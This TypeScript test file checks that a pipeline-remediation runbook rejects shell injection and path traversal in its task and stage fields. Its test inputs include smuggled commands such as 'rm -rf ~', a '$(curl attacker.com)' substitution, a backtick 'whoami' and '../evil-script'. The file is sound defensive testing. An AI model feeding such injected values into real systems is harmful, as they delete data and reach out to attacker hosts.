/**
 * rb-kick-pipeline security tests — HIGH-001 fix verification
 *
 * Confirms that:
 * 1. Shell injection via taskId/stage is rejected before execFile is called
 * 2. Valid inputs are accepted (dry_run mode only — no actual binary needed)
 * 3. Missing taskId returns early with 'failed'
 */

import { describe, expect, it } from "vitest";
import type { HealthAnomaly } from "../../types.js";
import { RbKickPipeline } from "../../runbooks/rb-kick-pipeline.js";

function makeAnomaly(stuck_task?: string, stuck_stage?: string): HealthAnomaly {
  return {
    id: "a-test",
    anomaly_type: "pipeline_stuck",
    target_id: "pipeline",
    severity: "high",
    detected_at: new Date().toISOString(),
    source_id: "pipeline-adapter",
    details: {
      ...(stuck_task !== undefined ? { stuck_task } : {}),
      ...(stuck_stage !== undefined ? { stuck_stage } : {}),
    },
    remediation_hint: "rb-kick-pipeline",
  };
}

describe("RbKickPipeline (HIGH-001 fix verification)", () => {
  const rb = new RbKickPipeline();

  it("dry_run returns descriptive string without executing anything", async () => {
    const anomaly = makeAnomaly("task-006-self-healing", "build");
    const steps = rb.build(anomaly);
    expect(steps).toHaveLength(1);
    const desc = await steps[0].dry_run();
    expect(desc).toContain("task-006-self-healing");
  });

  it("rejects taskId with shell metacharacters (semicolon injection)", async () => {
    const anomaly = makeAnomaly("task-006; rm -rf ~", "build");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    expect(result.status).toBe("failed");
    expect(result.output).toContain("Rejected");
    expect(result.output).toContain("taskId");
  });

  it("rejects taskId with command substitution $(...)", async () => {
    const anomaly = makeAnomaly("task-006$(curl attacker.com)", "build");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    expect(result.status).toBe("failed");
    expect(result.output).toContain("Rejected");
  });

  it("rejects stage with shell metacharacters (backtick injection)", async () => {
    const anomaly = makeAnomaly("task-006-test", "build`whoami`");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    expect(result.status).toBe("failed");
    expect(result.output).toContain("Rejected");
    expect(result.output).toContain("stage");
  });

  it("rejects stage with path traversal attempt", async () => {
    const anomaly = makeAnomaly("task-006-test", "../evil-script");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    expect(result.status).toBe("failed");
    expect(result.output).toContain("Rejected");
  });

  it("rejects empty stage string", async () => {
    const anomaly = makeAnomaly("task-006-test", "");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    expect(result.status).toBe("failed");
    expect(result.output).toContain("Rejected");
  });

  it("returns failed with no-task message when taskId is absent", async () => {
    const anomaly = makeAnomaly(undefined, "build");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    expect(result.status).toBe("failed");
    expect(result.output).toContain("No task_id");
  });

  it("accepts valid taskId and stage format (will fail on missing binary, not on validation)", async () => {
    const anomaly = makeAnomaly("task-006-self-healing", "build");
    const steps = rb.build(anomaly);
    const result = await steps[0].execute();
    // The binary ~/bin/pipeline-stage-done may not exist in test env — that's fine.
    // We confirm it doesn't reject due to input validation (output won't say 'Rejected:')
    expect(result.output).not.toContain("Rejected");
    // Status may be 'failed' due to missing binary — that's expected
  });

  it("rb metadata is correct", () => {
    expect(rb.id).toBe("rb-kick-pipeline");
    expect(rb.applies_to).toContain("pipeline_stuck");
    expect(rb.auto_approve_whitelist).toBe(false);
  });
});
